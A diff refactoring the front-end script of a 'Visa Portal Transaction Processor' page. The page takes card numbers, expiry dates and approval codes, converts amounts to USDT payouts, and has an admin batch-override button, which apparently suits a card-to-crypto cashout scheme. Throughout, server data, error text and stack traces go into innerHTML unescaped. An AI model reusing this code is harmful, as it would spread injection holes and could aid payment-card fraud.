@@ -25,7 +25,7 @@
 </head>
 <body>
   <div class="container-card">
-    <h1>💳 Visa Portal Transaction Processor</h1>
+    <h1>Visa Portal Transaction Processor</h1>
 
     <section id="transaction-form-section" class="mb-5 p-3 border rounded bg-light">
       <h2>Process New Transaction</h2>
@@ -74,9 +74,9 @@
     <div class="mt-5 pt-3 border-top">
       <h2 class="text-secondary mb-3">Operational Overview</h2>
 
-      <button id="fetch-stats-btn" class="btn btn-outline-primary mb-4 me-2" style="margin-right: 10px;">📊 Fetch System Statistics</button>
+      <button id="fetch-stats-btn" class="btn btn-outline-primary mb-4 me-2" style="margin-right: 10px;">Fetch System Statistics</button>
       <button id="fetch-stats-btn-standalone" class="btn btn-outline-primary me-2">Refresh Stats</button>
-      <button id="batch-override-btn" class="btn btn-outline-danger mb-4">⚠️ Batch Override (Admin)</button>
+      <button id="batch-override-btn" class="btn btn-outline-danger mb-4">Batch Override (Admin)</button>
       <div id="stats-output" class="p-3 border rounded bg-light text-muted"></div>
 
       <h3>Transaction Details & View</h3>
@@ -93,13 +93,16 @@
   </div>
 
   <footer class="text-center mt-5 pb-3 text-muted">
-    © 2025 Visa Portal Transaction System. All rights reserved.
+    2025 Visa Portal Transaction System. All rights reserved.
   </footer>
 
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
   <script>
     document.addEventListener('DOMContentLoaded', function () {
+      // Auto-detect the API base URL based on where the page is served
+      const API_BASE = window.location.origin;
+      
       const form = document.getElementById('transaction-form');
       const statusMessage = document.getElementById('status-message');
       const detailsOutput = document.getElementById('transaction-details');
@@ -108,7 +111,6 @@
       const usdtPayoutInput = document.getElementById('usdt_payout');
       const protocolSelector = document.getElementById('protocol_selector');
 
-      // --- PAYOUT CALCULATION ---
       function calculatePayout() {
         const amount = parseFloat(amountInput.value) || 0;
         const protocol = protocolSelector.value;
@@ -128,88 +130,65 @@
       amountInput.addEventListener('input', calculatePayout);
       protocolSelector.addEventListener('change', calculatePayout);
 
-      // --- SUBMIT TRANSACTION (form) ---
-      form.addEventListener('submit', async function (e) {
-        e.preventDefault();
-
-        const cardNumber = document.getElementById('card_number').value.trim();
-        const amountUsdInput = parseFloat(document.getElementById('amount').value);
-        const usdtPayoutValue = parseFloat(document.getElementById('usdt_payout').value);
-        const expiryDate = document.getElementById('expiry_date').value.trim();
-        const approvalCode = document.getElementById('approval_code').value.trim();
-
-        // Use the new handleTransactionUI function
-        await handleTransactionUI({
-          card_number: cardNumber,
-          amount: amountUsdInput,
-          usdtPayout: usdtPayoutValue,
-          expiry_date: expiryDate,
-          approval_code: approvalCode
-        });
-      });
-
-      // --- FETCH STATS (UPDATED VERSION) ---
+      // --- FETCH STATS ---
       async function fetchStats() {
         statusMessage.textContent = 'Fetching operational stats...';
         statusMessage.className = 'alert alert-info text-center mb-4';
         statsOutput.innerHTML = '<div class="text-muted">Loading statistics...</div>';
 
         try {
-          // Use relative URL (works with same-origin deployment)
-          const response = await fetch('/api/stats');
+          const response = await fetch(API_BASE + '/api/stats');
 
-          // Verify HTTP success status
           if (!response.ok) {
             const errorText = await response.text();
-            throw new Error(`Server status ${response.status}: ${errorText.substring(0, 50)}`);
+            throw new Error('Server status ' + response.status + ': ' + errorText.substring(0, 50));
           }
 
-          // Validate JSON content header
-          const contentType = response.headers.get("content-type");
-          if (!contentType || !contentType.includes("application/json")) {
+          const contentType = response.headers.get('content-type');
+          if (!contentType || !contentType.includes('application/json')) {
             const rawText = await response.text();
-            throw new Error(`Expected JSON response but received raw text/HTML`);
+            throw new Error('Expected JSON but got HTML: ' + rawText.substring(0, 100));
           }
 
           const data = await response.json();
 
-          // Update UI with formatted stats
           statusMessage.textContent = 'Stats loaded successfully!';
           statusMessage.className = 'alert alert-success text-center mb-4';
-          statsOutput.innerHTML = `
-            <div class="row">
-              <div class="col-md-4"><p><strong>Total Transactions:</strong> ${data.totalTransactions}</p></div>
-              <div class="col-md-4"><p><strong>Gross Revenue (USD):</strong> $${parseFloat(data.grossRevenue || 0).toFixed(2)}</p></div>
-              <div class="col-md-4"><p><strong>Total Fees Collected (USD):</strong> $${parseFloat(data.totalFees || 0).toFixed(2)}</p></div>
-            </div>
-          `;
+          statsOutput.innerHTML = [
+            '<div class="row">',
+            '<div class="col-md-4"><p><strong>Status:</strong> ' + (data.status || 'N/A') + '</p></div>',
+            '<div class="col-md-4"><p><strong>Uptime:</strong> ' + Math.floor(data.uptime || 0) + 's</p></div>',
+            '<div class="col-md-4"><p><strong>Total Transactions:</strong> ' + (data.totalTransactions || 0) + '</p></div>',
+            '<div class="col-md-4"><p><strong>Gross Revenue (USD):</strong> $' + parseFloat(data.grossRevenue || 0).toFixed(2) + '</p></div>',
+            '<div class="col-md-4"><p><strong>Total Fees (USD):</strong> $' + parseFloat(data.totalFees || 0).toFixed(2) + '</p></div>',
+            '</div>'
+          ].join('');
 
         } catch (error) {
           console.error('Error fetching stats:', error);
-          statusMessage.textContent = `Error: ${error.message}`;
+          statusMessage.textContent = 'Error: ' + error.message;
           statusMessage.className = 'alert alert-danger text-center mb-4';
           statsOutput.innerHTML = '<div class="text-danger">Failed to load statistics.</div>';
         }
       }
 
-      // --- HANDLE TRANSACTION UI (UPDATED VERSION with error tracker) ---
+      // --- HANDLE TRANSACTION UI ---
       async function handleTransactionUI(txData) {
         statusMessage.textContent = 'Processing transaction...';
         statusMessage.className = 'alert alert-info text-center mb-4';
         detailsOutput.innerHTML = '<p class="text-muted">Connecting to services...</p>';
 
         try {
-          const response = await fetch('/api/process', {
+          const response = await fetch(API_BASE + '/api/process', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(txData)
           });
 
-          // Check if response is valid JSON
-          const contentType = response.headers.get("content-type");
-          if (!contentType || !contentType.includes("application/json")) {
+          const contentType = response.headers.get('content-type');
+          if (!contentType || !contentType.includes('application/json')) {
             const rawText = await response.text();
-            throw new Error(`Expected JSON but got HTML/text: ${rawText.substring(0, 100)}`);
+            throw new Error('Expected JSON but got HTML/text: ' + rawText.substring(0, 100));
           }
 
           const result = await response.json();
@@ -217,63 +196,71 @@
           if (response.ok) {
             statusMessage.textContent = 'SUCCESS';
             statusMessage.className = 'alert alert-success text-center mb-4';
-            detailsOutput.innerHTML = `
-              <div class="p-3 bg-success/50 rounded">
-                <strong>✅ Transaction Processed Successfully!</strong>
-              </div>
-              <ul class="list-group list-group-flush mt-2" style="background-color: #f8f9fa;">
-                <li class="list-group-item"><strong class="text-success">Tx ID:</strong> ${result?.data?.transactionId || 'N/A'}</li>
-                <li class="list-group-item"><strong class="text-success">Gateway Status:</strong> ${result?.data?.gatewayStatus || 'N/A'}</li>
-                <li class="list-group-item"><strong class="text-success">Blockchain TX ID:</strong> ${result?.data?.payoutTxID || 'N/A'}</li>
-              </ul>
-              <details class="mt-3" style="border: 1px solid #dee2e6; border-radius: 5px;">
-                <summary class="btn btn-outline-secondary">View Full Record (DB Output)</summary>
-                <pre>${JSON.stringify(result?.data?.finalRecord, null, 2)}</pre>
-              </details>
-            `;
+            detailsOutput.innerHTML = [
+              '<div class="p-3 bg-success/50 rounded"><strong>Transaction Processed Successfully!</strong></div>',
+              '<ul class="list-group list-group-flush mt-2" style="background-color: #f8f9fa;">',
+              '<li class="list-group-item"><strong class="text-success">Tx ID:</strong> ' + (result?.data?.transactionId || 'N/A') + '</li>',
+              '<li class="list-group-item"><strong class="text-success">Gateway Status:</strong> ' + (result?.data?.gatewayStatus || 'N/A') + '</li>',
+              '<li class="list-group-item"><strong class="text-success">Blockchain TX ID:</strong> ' + (result?.data?.payoutTxID || 'N/A') + '</li>',
+              '</ul>',
+              '<details class="mt-3" style="border: 1px solid #dee2e6; border-radius: 5px;">',
+              '<summary class="btn btn-outline-secondary">View Full Record (DB Output)</summary>',
+              '<pre>' + JSON.stringify(result?.data?.finalRecord, null, 2) + '</pre>',
+              '</details>'
+            ].join('');
           } else {
             statusMessage.textContent = 'DANGER';
             statusMessage.className = 'alert alert-danger text-center mb-4';
-            detailsOutput.innerHTML = `<div class="alert alert-danger p-3"><strong style="color: red;">❌ Error Detail:</strong> ${result?.error || 'Unknown error'}</div>`;
+            detailsOutput.innerHTML = '<div class="alert alert-danger p-3"><strong style="color: red;">Error Detail:</strong> ' + (result?.error || 'Unknown error') + '</div>';
           }
         } catch (error) {
-          // --- PROCESS_LOGIC.JS ERROR TRACKER ENGAGED ---
           console.error('Caught process_logic error in index.html:', error);
 
-          // Extract the exact line where it crashed in process_logic.js
-          let errorLocation = "Unknown Location";
+          let errorLocation = 'Unknown Location';
           if (error.stack) {
             const stackLines = error.stack.split('\n');
             const logicFileTrace = stackLines.find(line => line.includes('process_logic.js'));
-            errorLocation = logicFileTrace ? logicFileTrace.trim() : stackLines[1]?.trim() || "Unknown Line";
+            errorLocation = logicFileTrace ? logicFileTrace.trim() : (stackLines[1]?.trim() || 'Unknown Line');
           }
 
           statusMessage.textContent = 'CRITICAL';
           statusMessage.className = 'alert alert-danger text-center mb-4';
 
-          detailsOutput.innerHTML = `
-            <div class="card border-danger text-danger p-3 bg-light">
-              <h5 class="card-title font-weight-bold">🔍 Transaction Error Tracker</h5>
-              <p class="mb-1"><strong>Error Message:</strong> ${error.message}</p>
-              <p class="mb-1"><strong>Location in Script:</strong> <code class="text-white bg-danger px-2 py-0.5 rounded">${errorLocation}</code></p>
-              <hr class="my-2">
-              <details>
-                <summary class="cursor-pointer font-weight-bold text-secondary text-sm">Click to view full execution path</summary>
-                <pre class="mt-2 text-muted small" style="white-space: pre-wrap; overflow-x: auto; background: #f8f9fa; padding: 10px;">${error.stack || 'No trace available.'}</pre>
-              </details>
-            </div>
-          `;
+          detailsOutput.innerHTML = [
+            '<div class="card border-danger text-danger p-3 bg-light">',
+            '<h5 class="card-title font-weight-bold">Transaction Error Tracker</h5>',
+            '<p class="mb-1"><strong>Error Message:</strong> ' + error.message + '</p>',
+            '<p class="mb-1"><strong>Location in Script:</strong> <code class="text-white bg-danger px-2 py-0.5 rounded">' + errorLocation + '</code></p>',
+            '<hr class="my-2">',
+            '<details>',
+            '<summary class="cursor-pointer font-weight-bold text-secondary text-sm">Click to view full execution path</summary>',
+            '<pre class="mt-2 text-muted small" style="white-space: pre-wrap; overflow-x: auto; background: #f8f9fa; padding: 10px;">' + (error.stack || 'No trace available.') + '</pre>',
+            '</details>',
+            '</div>'
+          ].join('');
         }
       }
 
       // --- EVENT LISTENERS ---
+      form.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        await handleTransactionUI({
+          card_number: document.getElementById('card_number').value.trim(),
+          amount: parseFloat(document.getElementById('amount').value),
+          usdtPayout: parseFloat(document.getElementById('usdt_payout').value),
+          expiry_date: document.getElementById('expiry_date').value.trim(),
+          approval_code: document.getElementById('approval_code').value.trim()
+        });
+      });
+
       document.getElementById('fetch-stats-btn').addEventListener('click', fetchStats);
       document.getElementById('fetch-stats-btn-standalone').addEventListener('click', fetchStats);
 
       document.getElementById('view-tx-btn').addEventListener('click', async () => {
         const txId = document.getElementById('viewTxId').value.trim();
         if (!txId) {
-          alert("Please enter a Transaction ID.");
+          alert('Please enter a Transaction ID.');
           return;
         }
 
@@ -282,17 +269,16 @@
         detailsOutput.innerHTML = '<p class="text-muted">Fetching detailed record...</p>';
 
         try {
-          const response = await fetch(`/api/transactions/${txId}`);
+          const response = await fetch(API_BASE + '/api/transactions/' + txId);
           const data = await response.json();
-          detailsOutput.innerHTML = `<div class="alert alert-success p-3"><strong style="color: green;">✅ Details Loaded Successfully:</strong><pre>${JSON.stringify(data, null, 2)}</pre></div>`;
+          detailsOutput.innerHTML = '<div class="alert alert-success p-3"><strong style="color: green;">Details Loaded Successfully:</strong><pre>' + JSON.stringify(data, null, 2) + '</pre></div>';
         } catch (error) {
           statusMessage.textContent = 'DANGER';
           statusMessage.className = 'alert alert-danger text-center mb-4';
-          detailsOutput.innerHTML = `<div class="alert alert-danger p-3"><strong style="color: red;">❌ Error viewing transaction:</strong> ${error.message || error}</div>`;
+          detailsOutput.innerHTML = '<div class="alert alert-danger p-3"><strong style="color: red;">Error viewing transaction:</strong> ' + (error.message || error) + '</div>';
         }
       });
 
-      // Batch override button
       document.getElementById('batch-override-btn').addEventListener('click', async () => {
         const batchId = prompt('Enter Batch ID to override:', '');
         if (!batchId) return;
@@ -301,10 +287,10 @@
         if (!newData) return;
 
         try {
-          const response = await fetch('/api/batch-override', {
+          const response = await fetch(API_BASE + '/api/batch-override', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ batchId, newData })
+            body: JSON.stringify({ batchId: batchId, newData: newData })
           });
           const result = await response.json();
           alert(result.message);
@@ -320,8 +306,8 @@
       document.body.appendChild(errorLog);
 
       window.onerror = function (message, source, lineno, colno, error) {
-        const log = `Error: ${message}\nSource: ${source}\nLine: ${lineno}\nColumn: ${colno}\nError: ${error}`;
-        errorLog.innerHTML = `<strong>⚠️ Error Log:</strong><pre>${log}</pre>`;
+        const log = 'Error: ' + message + '\nSource: ' + source + '\nLine: ' + lineno + '\nColumn: ' + colno + '\nError: ' + error;
+        errorLog.innerHTML = '<strong>Error Log:</strong><pre>' + log + '</pre>';
         return true;
       };
     });
